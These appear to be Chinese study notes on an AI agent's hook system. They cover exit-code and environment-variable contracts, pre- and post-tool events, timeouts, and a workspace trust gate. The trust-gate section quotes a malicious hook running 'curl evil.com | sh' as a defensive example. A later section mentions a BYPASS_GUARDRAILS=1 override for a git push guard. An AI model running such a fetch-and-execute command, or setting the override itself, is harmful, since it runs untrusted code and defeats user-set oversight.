# S04 Hook System 学习笔记

> 编号说明：本文按**官网/新版**课程序列（hook = s04）。对应仓库旧版脚本是 `agents/s08_hook_system.py`。两套轨道编号不一致，机制本身相同。

## 问题层 — 是什么 / 为什么存在

### 1. Hook 在解决什么问题？

s07 的权限系统（validator + deny/allow 规则 + 问用户）是**写死在 agent 内核里**的。想加一条自己的策略（比如「拦 push 到 main」），就得改 `check()` 或加规则——每加一条都要动内核源码。Hook 解决的是：**在不修改循环/内核的前提下，往 agent 里插入自定义行为。**

### 2. 为什么不能把策略直接写进内核？（核心矛盾）

Claude Code 是一个**发给所有人用的工具**：一份代码，千万用户。但**策略是因人/因项目而异的**——你想拦 push main，别人想拦 `npm publish`，公司想强制跑 lint。这些策略不可能全烤进那份共享代码里。

所以 hook 的本质是一道**接缝（seam）**：把「厂商发布的 agent 内核」和「用户本地的策略」解耦开。内核保持稳定简单，策略活在外面，用户想加就加、想改就改，完全不碰内核。这就是 Harness 留给用户的扩展口子。

### 3. 核心洞察：「不修改循环，扩展 agent」

循环骨架（调模型 → 执行工具 → 喂回结果）一行没改。新增的只是：在循环的几个关键时刻，去外部跑用户配置的脚本，让脚本有机会阻止 / 注入 / 改写。扩展点写在循环里，扩展逻辑活在循环外。

## 方案层 — 怎么实现的 / 设计取舍

### 4. 进程间契约：两个独立进程怎么对话？

主程序是 Python 进程，hook 脚本（如 `git-guardrails.sh`）是另一个独立进程。进程之间不能像函数那样传参/返回，得靠**操作系统级的进程契约**。s08 用了三样：

| 方向 | 机制 | 传什么 |
|---|---|---|
| 主程序 → hook | **环境变量** `HOOK_*` | `HOOK_EVENT` / `HOOK_TOOL_NAME` / `HOOK_TOOL_INPUT` / `HOOK_TOOL_OUTPUT` |
| hook → 主程序 | **退出码** returncode | 0=放行 / 1=拦截 / 2=注入消息 |
| hook → 主程序 | **stderr 文本** | 拦截原因 / 要注入的消息 |
| hook → 主程序 | **stdout JSON**（进阶） | updatedInput / additionalContext / permissionDecision |

这套「环境变量喂输入 + 退出码传决定 + std 流传数据」是 Unix 几十年的进程间契约老传统（git hooks、CI 全这么干），hook 直接复用它。

### 5. 退出码契约：0 / 1 / 2

```
退出码 0 -> 放行（stdout 可选结构化 JSON 做精细控制）
退出码 1 -> 阻止本次工具执行（stderr 作为原因）
退出码 2 -> 注入一条消息给模型（stderr 作为内容），不阻止执行
```

退出码是**粗粒度开关**（拦/放/提醒）；结构化 stdout 是**细粒度操控**（改输入/注上下文/管权限）。简单 hook 用退出码就够，复杂 hook 输出 JSON。

### 6. 三个事件的时机——时机决定可见数据

| 事件 | 时机 | 拿得到什么 | 典型用途 |
|---|---|---|---|
| `SessionStart` | 程序启动，整个会话一次 | 无工具上下文 | 打印环境、启动检查、注入初始上下文 |
| `PreToolUse` | 每次工具**执行前** | 工具名 + 输入 | **拦截**（退出码1）、改写、提醒 |
| `PostToolUse` | 每次工具**执行后** | 工具名 + 输入 + **输出** | 跑 lint、记审计日志、追加备注 |

为什么 PostToolUse 拿得到 `tool_output` 而 PreToolUse 拿不到？因为 Pre 在执行前，输出还不存在。`git-guardrails.sh` 必然是 PreToolUse——执行后再拦就晚了（push 已经发出去了）。

### 7. matcher：工具名过滤器

一个 hook 通常只关心某类工具。`hook_def` 里写 `matcher`：`"*"` 或缺省 = 匹配所有工具；否则要求工具名精确相等。`git-guardrails.sh` 配成只匹配 `bash`（git 命令走 bash）。

### 8. 信任门：为什么未信任工作区不跑 hook？

`run_hooks` 一开头就检查 `_check_workspace_trust()`，未信任则直接返回空结果（一个 hook 都不跑）。这是关键安全设计：hook 会执行**任意 shell 命令**。如果 `git clone` 了陌生仓库，里面带了恶意 `.hooks.json`（如 SessionStart 配 `curl evil.com | sh`），没有信任门就会在打开项目时自动执行。规则：只有显式标记 `.claude/.claude_trusted` 的工作区才跑 hook。

（对比 s07：那里 `is_workspace_trusted` 定义了却没接入管道；s08 这里真正用上了。）

### 9. 超时保护：为什么 hook 必须有 timeout？

hook 是外部进程，可能卡死（死循环、等网络）。`subprocess.run(..., timeout=HOOK_TIMEOUT)` 30 秒超时——否则一个卡住的 hook 能挂起整个 agent。超时后打印 Timeout，agent 继续跑。

### 10. agent_loop 集成 + 被拦也回 tool_result

集成点：`SessionStart`（启动）→ 循环里每个工具：`PreToolUse` → 若 blocked 则 `continue` 跳过执行 → 否则执行 → `PostToolUse`。

关键边界：被 hook 拦掉（退出码 1）的工具，`continue` 之前**也要 append 一条 tool_result**（内容=拦截原因）。两个原因和 s07 同源：① API 要求 tool_use/tool_result 配对；② 拦截原因是给模型的反馈，让它知道为什么、好换路。

## 影响层 — 更大的上下文

### 11. s07 权限 vs s08 hook——同样能拦工具，区别在哪？

两者功能重叠（都能拦掉一个工具调用），但分工在**另一个轴**：

- **s07 权限** = 厂商**内置写死**的拦截，改它要动 agent 内核源码。
- **s08 hook** = **用户写的外部脚本**，通过 `.hooks.json` 插进来，加/改拦截**完全不碰内核**。

s08 把"拦什么、怎么拦"的控制权从厂商交给了用户。这正是「不修改循环，扩展 agent」的落地。

### 12. 对照真实 Claude Code：git-guardrails.sh 全链路

平时用 Claude Code 被 `git-guardrails.sh` 拦下 push 到 main、得加 `BYPASS_GUARDRAILS=1` 才过，就是这套机制：

```
模型要调 bash(git push origin main)
  → matcher 匹配 bash ✓
  → 主程序把命令写进 $HOOK_TOOL_INPUT，跑 git-guardrails.sh
  → 脚本读 $HOOK_TOOL_INPUT，发现 push main → 退出码 1 + stderr 写原因
  → 主程序见 blocked → 不执行，append 一条 tool_result(内容=拦截原因)
  → 模型收到反馈，改走别的路（或提示加 BYPASS）
```

### 13. 一个教学版的小坑：updatedInput 未接通执行

退出码 0 时若 stdout 是 JSON，`updatedInput` 本应改写工具输入。但教学版里它改的是 `ctx["tool_input"]`，而执行工具用的是另一个局部变量 `tool_input`，两者解绑后改写**实际没生效**（只有 PostToolUse 的 ctx 看得到）。真实 CC 里是生效的，教学版为简化漏接了。

## 关键概念

### Seam（接缝）

Hook 是一道接缝，把「稳定的厂商内核」和「多变的本地策略」分开：

```
┌─────────────────┐         ┌──────────────────┐
│  厂商 agent 内核 │  seam   │  用户本地策略     │
│  （循环不变）    │ ◄─────► │  （.hooks.json）  │
│                 │ 退出码   │  外部 shell 脚本  │
└─────────────────┘ 环境变量 └──────────────────┘
```

加策略 = 在接缝外面加脚本，不动接缝里面的内核。这是 harness engineering 的典型手法：把易变的东西挤到边界外，让核心保持小而稳。
